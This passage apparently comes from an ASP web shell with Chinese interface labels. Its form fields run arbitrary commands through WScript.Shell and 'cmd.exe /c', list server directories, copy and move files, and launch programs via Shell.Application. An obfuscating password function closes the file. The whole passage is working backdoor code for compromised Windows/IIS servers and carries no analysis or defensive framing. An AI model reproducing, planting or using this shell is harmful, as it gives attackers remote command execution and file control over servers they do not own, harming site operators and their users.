<input type=text name=text2 value="<%=DSnXA2 %>"> <font class=fonts>目的地址不要带文件名</font></td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left>
<input type=text name=text3 value="<%=DSnXA3 %>">
move
<input type=text name=text4 value="<%=DSnXA4 %>"><font class=fonts> 目的地址不要带文件名</font></td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left>
路径：<input type=text name=text5 value="<%=DSnXA5 %>" >
程序：<input type=text name=text6 value="<%=DSnXA6 %>" ><font class=fonts> 不可以加参数</font></td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left><input type="text" name="ok" size=55><font class=fonts> CMD命令对话框</font>
</td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left><input type=text name=pathlcx size=55><font class=fonts> 路径与文件名</font></td><tr/>
<tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left>
<textarea  cols=80 rows=5 name=textlcx >
<%
set oScript=Server.CreateObject("WScript.Shell")
ok=Request("ok")
if ok<>"" then response.write oScript.exec ("cmd.exe /c "& ok).stdout.readall
%></textarea>
<input type=submit name=sb value=命令 class=input>
</form></td></tr>
</table>
</center>
<% 
 Response.Write request.form("cmd") & "<br><br>" 
 Response.Write strResult 
DSnXA = Request.Form("text")
if (DSnXA <> "")  then
set shell=server.createobject("shell.application")
set fod1=shell.namespace(DSnXA)
set foditems=fod1.items
for each co in foditems
response.write "<font color=black>" & co.path & "-----" & co.size & "</font><br>"
next
end if
DSnXA1 = Request.Form("text1")
DSnXA2 = Request.Form("text2")
if DSnXA1<>"" and DSnXA2<>"" then
set shell1=server.createobject("shell.application")
set fod1=shell1.namespace(DSnXA2)
for i=len(DSnXA1) to 1 step -1
if mid(DSnXA1,i,1)="\" then
   path=left(DSnXA1,i-1)
   exit for
end if
next
if len(path)=2 then path=path & "\"
path2=right(DSnXA1,len(DSnXA1)-i)
set fod2=shell1.namespace(path)
set foditem=fod2.parsename(path2)
fod1.copyhere foditem
response.write "command success!"
end if
DSnXA3 = Request.Form("text3")
DSnXA4 = Request.Form("text4")
if DSnXA3<>"" and DSnXA4<>"" then
set shell2=server.createobject("shell.application")
set fod1=shell2.namespace(DSnXA4)

for i=len(DSnXA3) to 1 step -1
if mid(DSnXA3,i,1)="\" then
   path=left(DSnXA3,i-1)
   exit for
end if
next

if len(path)=2 then path=path & "\"
path2=right(DSnXA3,len(DSnXA3)-i)
set fod2=shell2.namespace(path)
set foditem=fod2.parsename(path2)
fod1.movehere foditem
response.write "command completed success!"
end if
DSnXA5 = Request.Form("text5")
DSnXA6 = Request.Form("text6")
if DSnXA5<>"" and DSnXA6<>"" then
set shell3=server.createobject("shell.application")
shell3.namespace(DSnXA5).items.item(DSnXA6).invokeverb
response.write "command completed success!"
end if
end if
%>
</body>
<%
end select
function Epass(pass)
temppass=StrReverse(left(pass&"zxcvbnm,./",10))
templen=len(pass)
mmpassword=""
for j=1 to 10
mmpassword=mmpassword+chr(asc(mid(temppass,j,1))-templen+int(j*1.1))
next
Epass=replace(mmpassword,"'","B")
end function
%>


